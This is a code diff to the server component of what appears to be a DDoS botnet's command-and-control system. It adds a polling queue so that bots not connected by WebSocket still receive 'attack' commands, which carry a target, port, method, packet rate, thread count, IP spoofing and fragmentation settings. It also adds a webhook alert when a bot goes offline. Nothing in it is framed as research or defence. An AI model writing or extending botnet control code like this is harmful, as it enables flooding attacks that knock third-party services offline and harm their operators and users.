@@ -24,6 +24,21 @@ class BotConnectionManager:
         self._hb_task = None
         # task_id -> set of bot_ids that reported attack_done
         self._task_done: Dict[str, set] = {}
+        # Pending commands for HTTP/2 poll mode bots
+        self._pending_cmds: Dict[str, list] = {}
+
+    def get_pending_command(self, bot_id: str) -> dict | None:
+        """Return next pending command for HTTP/2 poll mode bot."""
+        cmds = self._pending_cmds.get(bot_id)
+        if cmds:
+            return cmds.pop(0)
+        return None
+
+    def queue_command(self, bot_id: str, cmd: dict):
+        """Queue a command for HTTP/2 poll mode bot."""
+        if bot_id not in self._pending_cmds:
+            self._pending_cmds[bot_id] = []
+        self._pending_cmds[bot_id].append(cmd)
 
     async def _start_heartbeat_checker(self):
         while True:
@@ -148,6 +163,21 @@ class BotConnectionManager:
             "fragmentation": task.get("fragmentation", 0),
             **flags,
         })
+        if not ok:
+            # Bot not on WS — queue for HTTP/2 poll mode
+            self.queue_command(bot_id, {
+                "type": "attack",
+                "task_id": task["id"],
+                "target": task["target"],
+                "port": task["port"],
+                "method": method,
+                "duration": task["duration"],
+                "max_pps": task.get("pps", 100000),
+                "max_threads": task.get("threads", 100),
+                "spoof_mode": task.get("spoof_mode", 0),
+                "fragmentation": task.get("fragmentation", 0),
+                **flags,
+            })
         print(f"[WS] attack cmd bot={bot_id} method={method} ok={ok}")
 
     async def send_stop_command(self, bot_id: str, task_id: str):
@@ -382,6 +412,14 @@ async def handle_bot_websocket(ws: WebSocket, bot_id: str):
         code = getattr(e, "code", None)
         print(f"[WS] bot {session_key} disconnected code={code}")
         await manager.disconnect(session_key, ws)
+        # Webhook: bot went offline
+        try:
+            from app.services.background_service import send_webhook
+            bot = await BotService.get_bot(_try_uuid(session_key)) if _try_uuid(session_key) else None
+            bot_info = f"{bot.bot_identifier}" if bot else session_key
+            await send_webhook("Bot Offline", f"Bot: {bot_info}\nCode: {code}")
+        except Exception:
+            pass
     except Exception as e:
         print(f"[WS] bot {session_key} error: {type(e).__name__}: {e}")
         try:
